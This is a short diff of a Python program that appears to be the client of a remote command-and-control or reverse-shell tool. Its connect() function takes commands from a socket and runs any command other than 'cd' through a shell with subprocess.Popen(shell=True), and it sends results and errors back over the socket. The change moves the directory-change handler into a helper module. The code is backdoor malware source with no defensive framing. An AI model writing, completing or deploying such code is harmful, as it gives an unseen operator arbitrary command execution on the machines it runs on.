@@ -41,12 +41,7 @@ def connect():
 				s.send ( str(e) ) # send the exception error
 				pass
 		elif command[:2] == 'cd':
-			try:
-				res = modules.cd(command)
-				s.send('[CCCli] Changed directory to {}'.format(res['path']))
-			except:
-				print('[ERROR] The system path cannot be found.')
-				s.send('[ERROR]'.encode())
+			modules.cd(s, command)
 		else:
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
